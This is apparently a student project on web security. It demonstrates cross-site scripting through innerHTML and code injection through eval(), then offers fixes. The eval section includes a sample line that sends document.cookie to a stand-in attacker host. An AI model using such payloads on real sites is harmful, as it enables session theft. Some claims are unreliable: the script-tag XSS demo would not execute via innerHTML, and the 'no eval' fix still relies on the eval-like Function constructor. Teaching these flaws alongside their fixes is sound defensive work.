## MSCS535 Project 2

## 1. Provide a JavaScript code injection via web applications, where an attacker can inject malicious scripts into web pages. 

### Problem: Cross-Site Scripting (XSS)
When a website displays user input without checking it first, attackers can inject malicious JavaScript code.

#### Vulnerable Code:
```html
<!DOCTYPE html>
<html>
<body>
    <h1>Comment System</h1>
    
    <!-- User can type comments here -->
    <textarea id="userComment" placeholder="Enter your comment"></textarea>
    <button onclick="addComment()">Post Comment</button>
    
    <div id="comments"></div>
    
    <script>
        function addComment() {
            var comment = document.getElementById("userComment").value;
            
            // PROBLEM: Directly putting user input into the page
            document.getElementById("comments").innerHTML = 
                "<p>" + comment + "</p>";
        }
    </script>
</body>
</html>
```

#### How the Attack Works:
Instead of typing a normal comment, an attacker types:
```html
<script>alert("You've been hacked!");</script>
```

When this gets posted, the malicious script runs and can:
- Steal user cookies
- Redirect to malicious websites  
- Access sensitive information

---

## 2. Provide a dynamic evaluation of code at runtime, such as eval() in JavaScript that can be exploited by attackers. 

### Problem: Using eval() Function
The `eval()` function runs any text as JavaScript code. This is dangerous when the text comes from users.

#### Vulnerable Code:
```html
<!DOCTYPE html>
<html>
<body>
    <h1>Simple Calculator</h1>
    
    <!-- User types math expressions here -->
    <input type="text" id="mathInput" placeholder="Type math like: 2+2">
    <button onclick="calculate()">Calculate</button>
    
    <p id="result"></p>
    
    <script>
        function calculate() {
            var expression = document.getElementById("mathInput").value;
            
            // PROBLEM: Using eval() with user input
            var answer = eval(expression);
            
            document.getElementById("result").innerHTML = "Answer: " + answer;
        }
    </script>
</body>
</html>
```

#### How the Attack Works:
Instead of typing math like "2+2", an attacker types:
```javascript
alert("Hacked!"); 2+2
```

Or worse:
```javascript
fetch('http://evil-site.com/steal?data=' + document.cookie)
```

The `eval()` function will run this malicious code, allowing attackers to:
- Execute any JavaScript they want
- Steal sensitive data
- Take control of the user's session

---

## 3. Then provide the mitigation code to fix the security problems for the vulnerabilities you listed in 1 and 2. 

### Fix #1: Secure Comment System
```html
<!DOCTYPE html>
<html>
<body>
    <h1>Secure Comment System</h1>
    
    <textarea id="userComment" placeholder="Enter your comment"></textarea>
    <button onclick="addCommentSafely()">Post Comment</button>
    
    <div id="comments"></div>
    
    <script>
        function addCommentSafely() {
            var comment = document.getElementById("userComment").value;
            
            // FIX: Use textContent instead of innerHTML
            // This treats input as plain text, not code
            var commentElement = document.createElement("p");
            commentElement.textContent = comment;  // Safe!
            
            document.getElementById("comments").appendChild(commentElement);
        }
    </script>
</body>
</html>
```

**Why this works:** `textContent` treats everything as plain text, so even if someone types `<script>` tags, they won't run as code.

### Fix #2: Secure Calculator  
```html
<!DOCTYPE html>
<html>
<body>
    <h1>Secure Calculator</h1>
    
    <input type="text" id="mathInput" placeholder="Type math like: 2+2">
    <button onclick="calculateSafely()">Calculate</button>
    
    <p id="result"></p>
    
    <script>
        function calculateSafely() {
            var expression = document.getElementById("mathInput").value;
            
            // FIX: Check if input contains only safe math characters
            var safePattern = /^[0-9+\-*/(). ]+$/;
            
            if (!safePattern.test(expression)) {
                document.getElementById("result").textContent = "Error: Only numbers and +, -, *, /, (), . allowed";
                return;
            }
            
            try {
                // Still avoid eval - use Function constructor more safely
                var answer = new Function('return ' + expression)();
                document.getElementById("result").textContent = "Answer: " + answer;
            } catch (error) {
                document.getElementById("result").textContent = "Error: Invalid math expression";
            }
        }
    </script>
</body>
</html>
```

**Why this works:** 
1. We check that input only contains safe math characters
2. We use `textContent` for safe output
3. We handle errors properly

### Fix #3: Even Better - No eval() at all
```javascript
function calculateWithoutEval() {
    var expression = document.getElementById("mathInput").value;
    
    // Split the expression and validate each part
    var parts = expression.split(/([+\-*/])/);
    
    // Check each part is either a number or operator
    for (var i = 0; i < parts.length; i++) {
        var part = parts[i].trim();
        if (i % 2 === 0) { // Should be number
            if (isNaN(part)) {
                document.getElementById("result").textContent = "Error: Invalid number";
                return;
            }
        } else { // Should be operator
            if (!['+', '-', '*', '/'].includes(part)) {
                document.getElementById("result").textContent = "Error: Invalid operator";
                return;
            }
        }
    }
    
    // Now it's safe to calculate
    try {
        var answer = new Function('return ' + expression)();
        document.getElementById("result").textContent = "Answer: " + answer;
    } catch (error) {
        document.getElementById("result").textContent = "Error: Calculation failed";
    }
}
```

---

## 4. Summary

### The Problems:
1. **XSS**: Putting user input directly into web pages without checking it
2. **eval() vulnerabilities**: Running user input as code

### The Solutions:
1. **Use `textContent` instead of `innerHTML`** - treats input as text, not code
2. **Validate user input** - only allow safe characters
3. **Avoid `eval()`** - never run user input as code
4. **Handle errors properly** - don't let bad input crash your program

### Key Rule: 
**Never trust what users type in. Always check it first!**

---

## 5. References

1. Kohnfelder, L. (2021). *Designing Secure Software*. Random House Publishing Services. https://reader2.yuzu.com/books/9781718501935

2. Richardson, T., & Thies, C. N. (2012). *Secure Software Design*. Jones & Bartlett Learning. https://reader2.yuzu.com/books/9781284102680